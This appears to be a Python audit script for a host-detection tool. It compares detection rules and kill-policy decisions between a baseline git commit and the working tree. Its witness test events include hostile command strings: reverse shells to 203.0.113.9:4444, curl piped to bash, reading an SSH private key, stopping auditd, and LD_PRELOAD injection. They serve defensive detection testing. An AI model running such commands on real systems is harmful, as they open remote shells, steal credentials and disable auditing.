"""Differential rule audit with an explicit reproducible baseline.

Açık ve yeniden üretilebilir kaynak temeliyle kural fark denetimi.
Komutlar yalnız metindir; sinyal veya ağ müdahalesi yapılmaz.
"""
import copy
import argparse
import importlib.util
import json
from pathlib import Path
import re
import subprocess
import time
import types
import sys
import tempfile
import hashlib
from unittest.mock import patch,Mock
from satsuma.smart_rules import SmartRuleEngine
from satsuma.response_policy import authorize_destructive
from satsuma.action_contract import canonical_action
from tools.build_rule_response_inventory import build

ROOT=Path(__file__).resolve().parents[1]
BASE='9441354429a7b81227fc80ed46eb2a3fc69bde54'


def old_module(name,path):
    module=types.ModuleType(name);module.__package__='satsuma';module.__file__=str(ROOT/path)
    text=subprocess.check_output(['git','show',BASE+':'+path],cwd=ROOT,text=True)
    sys.modules[name]=module
    exec(compile(text,module.__file__,'exec'),module.__dict__)
    return module


def regex_example(pattern):
    from re import _parser
    def walk(items):
        out=''
        for op,arg in items:
            op=str(op)
            if op=='LITERAL':out+=chr(arg)
            elif op=='NOT_LITERAL':out+='x' if arg!=ord('x') else 'y'
            elif op=='ANY':out+='x'
            elif op=='SUBPATTERN':out+=walk(arg[-1])
            elif op=='ATOMIC_GROUP':out+=walk(arg)
            elif op=='BRANCH':out+=walk(arg[1][0])
            elif op in ('MAX_REPEAT','MIN_REPEAT','POSSESSIVE_REPEAT'):out+=walk(arg[2])*min(arg[0],30)
            elif op=='IN':
                negate=any(str(o)=='NEGATE' for o,a in arg)
                if negate:
                    banned={chr(a) for o,a in arg if str(o)=='LITERAL'}
                    out+=next(c for c in 'x a1/' if c not in banned)
                else:
                    sub=next(((o,a) for o,a in arg if str(o)!='NEGATE'),None)
                    if sub:
                        o,a=sub
                        out+=chr(a[0]) if str(o)=='RANGE' else walk([(o,a)])
            elif op=='CATEGORY':out+=' ' if 'SPACE' in str(arg) and 'NOT' not in str(arg) else '1' if 'DIGIT' in str(arg) else 'x'
        return out
    return walk(_parser.parse(pattern,0))


def first(value):return value[0] if isinstance(value,list) else value


def witness(rule,engine,index):
    m=rule['base_match']
    event={'id':f'audit-{index}','timestamp':int(time.time()),'source':first(m.get('source','sys_proc')),
           'pid':4242,'starttime':1234,'exe':'/opt/isolated-fixture/tool','cmd':'fixture',
           'uid':1000,'parent_cmd':'fixture-parent','action':'new_process','kind':'process','category':'host'}
    for key in ('action','kind','category','uid','operation'):
        if key in m:event[key]=first(m[key])
    if 'uid_not' in m and str(event['uid']) in {str(v) for v in (m['uid_not'] if isinstance(m['uid_not'],list) else [m['uid_not']])}:event['uid']=12345
    if 'file_path' in m:event['file_path']=re.sub(r'\[([^\]]+)\]',lambda found:found[1][0],str(first(m['file_path']))).replace('*','fixture').replace('?','x')
    if 'exe_contains' in m:event['exe']=str(first(m['exe_contains']))
    if 'exe_regex' in m:event['exe']=regex_example(first(m['exe_regex']))
    if 'env_contains' in m:event['env']=str(first(m['env_contains']))+'=fixture'
    if 'parent_contains' in m:event['parent_cmd']=str(first(m['parent_contains']))
    commands=[]
    for key in ('cmd_contains','cmd_arg_contains'):
        if key in m:
            values=m[key] if isinstance(m[key],list) else [m[key]]
            commands += [str(v) if key=='cmd_contains' else 'fixture '+str(v) for v in values]
    for key in ('cmd_regex_cs','cmd_regex'):
        if key in m:
            commands += [regex_example(v) for v in (m[key] if isinstance(m[key],list) else [m[key]])]
    commands=commands or ['fixture']
    # These inert public examples cover parser-sensitive quote/pipe witnesses.
    commands += ["python3 -c 'import socket; print(1)'","python -c 'import socket; print(1)'",
                 'telnet 203.0.113.9 4444 | /bin/sh','curl https://example.invalid/exploit',
                 'env LD_PRELOAD=/fixture/probe.so fixture','cat /etc/ld.so.preload',
                 'bpftrace -e "kprobe:execve { }"','bash -i /dev/tcp/203.0.113.9/4444',
                 'curl https://example.invalid/script | bash','socat EXEC:/bin/sh TCP:203.0.113.9:4444',
                 'systemctl stop auditd','echo x > /proc/sys/fixture','awk /inet/tcp/','tar x | curl',
                 'cat /fixture/.ssh/id_rsa','env | grep fixture']
    for command in commands:
        candidate={**event,'cmd':command}
        try:
            if engine._matches(m,candidate) and (rule.get('threshold') is None or engine._score(rule,candidate)>=rule['threshold']):return candidate
        except (ValueError,TypeError):continue
    return None


def detections(engine,event):
    fields=('rule_id','rule_name','classification','severity','confidence','score','threshold','actions','matched_rules','dedup_group','finding_id')
    return [{k:f.get(k) for k in fields} for f in engine.match(event)]


def main():
    global BASE
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--baseline',default=BASE)
    parser.add_argument('--output-dir',type=Path)
    args=parser.parse_args();BASE=args.baseline
    if args.output_dir:args.output_dir.mkdir(parents=True,exist_ok=True)
    baseline_module=old_module('satsuma.audit_old_smart','satsuma/smart_rules.py')
    baseline_root=tempfile.TemporaryDirectory(prefix='satsuma-baseline-rules-')
    source=Path(baseline_root.name)
    paths=subprocess.check_output(['git','ls-tree','-r','--name-only',BASE,'--','rules'],cwd=ROOT,text=True).splitlines()
    for name in paths:
        target=source/name;target.parent.mkdir(parents=True,exist_ok=True)
        target.write_bytes(subprocess.check_output(['git','show',BASE+':'+name],cwd=ROOT))
    baseline=baseline_module.SmartRuleEngine(source/'rules')
    previous_policy=old_module('satsuma.audit_old_policy','satsuma/response_policy.py')
    previous_broker=old_module('satsuma.audit_old_contract','satsuma/action_contract.py')
    previous_policy.canonical_action=previous_broker.canonical_action
    previous_policy.DESTRUCTIVE_ACTIONS=previous_broker.DESTRUCTIVE_ACTIONS
    from satsuma.action_contract import SafeActionBroker
    current=SmartRuleEngine(ROOT/'rules')
    old_rules={r['_id']:r for r in baseline.rules}
    config={'response_enabled':True,'destructive_response_enabled':True,'destructive_allowed_actions':['process_kill'],
            'auto_action_process_enabled':True,'user_enforcement':True}
    results=[];witnesses=[]
    for index,rule in enumerate(current.rules):
        rid=rule['_id'];old=old_rules[rid];event=witness(old,baseline,index)
        if event is None:
            results.append({'rule_id':rid,'status':'NO_POSITIVE_WITNESS','match':old['base_match']});continue
        witnesses.append({'rule_id':rid,'event':event})
        cases={'positive':event,'negative':{**event,'source':'unknown_fixture','cmd':'harmless_fixture'},
               'wrong_source':{**event,'source':'unknown_fixture'},'stale':{**event,'timestamp':event['timestamp']-600}}
        changes=[];case_results=[]
        for name,case in cases.items():
            before=detections(baseline,copy.deepcopy(case));after=detections(current,copy.deepcopy(case))
            if name=='positive' and not any(rid in (f.get('matched_rules') or [f.get('rule_id')]) for f in before):
                changes.append('positive:rule_not_detected')
            if before!=after:changes.append(name+':detection')
            finding={**old,'rule_id':rid,'event':case,'actions':old['actions']}
            context={'automated':True,'pid':4242,'user_enforcement':True}
            a=previous_policy.authorize_destructive('process_kill',finding,config,context)
            b=authorize_destructive('process_kill',finding,config,context)
            evidence_before=[canonical_action(x) for x in baseline._normalize_actions(old['actions'])]
            evidence_after=[canonical_action(x) for x in current._normalize_actions(rule['actions'])]
            metadata_context={'finding':finding,'event':case}
            metadata_equal=previous_broker.SafeActionBroker._evidence_metadata(metadata_context)==SafeActionBroker._evidence_metadata(metadata_context)
            if evidence_before!=evidence_after or not metadata_equal:changes.append(name+':evidence_plan')
            if (a.allowed,a.reasons)!=(b.allowed,b.reasons):changes.append(name+':policy')
            case_results.append({'case':name,'detection_equal':before==after,'evidence_equal':evidence_before==evidence_after and metadata_equal,
                'old_policy_allowed':a.allowed,'new_policy_allowed':b.allowed,'policy_equal':(a.allowed,a.reasons)==(b.allowed,b.reasons)})
        configured={**config,'rule_response_requirements':{rid:{'minimum_sources':2}}}
        single_finding={**old,'rule_id':rid,'event':event,'actions':old['actions']}
        old_decision=previous_policy.authorize_destructive('process_kill',single_finding,config,{'automated':True,'pid':4242,'user_enforcement':True})
        new_decision=authorize_destructive('process_kill',single_finding,configured,{'automated':True,'pid':4242,'user_enforcement':True})
        expected_restriction={'scenario':'individually configured min_sources=2, no trusted evidence store',
            'old_allowed':old_decision.allowed,'new_allowed':new_decision.allowed,
            'new_reasons':list(new_decision.reasons),'expected_additional_denial':old_decision.allowed and not new_decision.allowed}
        results.append({'rule_id':rid,'expected_policy_change':expected_restriction,'status':'PASS' if not changes else 'CHANGED','actions_equal':old['actions']==rule['actions'],
                        'cases':case_results,'unexpected_changes':changes,
                        'proposed_multi_source_policy':'not applied; requires individual operator approval'})
    report={'baseline_commit':BASE,
            'baseline_source':{'materialized_from_git':True,'uses_worktree_rule_files':False,
                'rules_tree':subprocess.check_output(['git','rev-parse',BASE+':rules'],cwd=ROOT,text=True).strip()},
            'current_source':{'working_tree':True,'separate_from_baseline_directory':(source/'rules').resolve()!=(ROOT/'rules').resolve()},
            'file_comparison':[{
                'path':name,'baseline_sha256':hashlib.sha256((source/name).read_bytes()).hexdigest(),
                'working_tree_sha256':hashlib.sha256((ROOT/name).read_bytes()).hexdigest(),
                'same_bytes':(source/name).read_bytes()==(ROOT/name).read_bytes()} for name in paths],
            'rules_before':len(baseline.rules),'rules_after':len(current.rules),
            'unique_ids':len(set(old_rules)),'rule_results':results,
            'passed':sum(r['status']=='PASS' for r in results),'no_positive_witness':sum(r['status']=='NO_POSITIVE_WITNESS' for r in results),
            'unexpected_changes':sum(r['status']=='CHANGED' for r in results),
            'expected_additional_denials_with_explicit_per_rule_multi_policy':sum(r.get('expected_policy_change',{}).get('expected_additional_denial',False) for r in results),
            'comparison_scope':'engine detections, safe-action/evidence plan and existing policy gate; no signals/network/service actions',
            'note':'Target identity and timestamp checks in the final response layer are covered by isolated primitive tests, not claimed by this policy-only comparison.'}
    (args.output_dir/'rule-behavior.json' if args.output_dir else ROOT/'docs/RULE-BEHAVIOR-AUDIT-2026.json').write_text(json.dumps(report,ensure_ascii=False,indent=2)+'\n')
    (args.output_dir/'rule-audit-events.json' if args.output_dir else ROOT/'tests/fixtures/rule-audit-events-2026.json').write_text(json.dumps(witnesses,ensure_ascii=False,indent=2)+'\n')
    print(json.dumps({k:v for k,v in report.items() if k not in ('rule_results','note','file_comparison')}))
    for row in results:
        if row['status']!='PASS':print(row['rule_id'],row['status'],row.get('match',row.get('unexpected_changes')))
    if report['no_positive_witness'] or report['unexpected_changes']:raise SystemExit(1)

if __name__=='__main__':main()
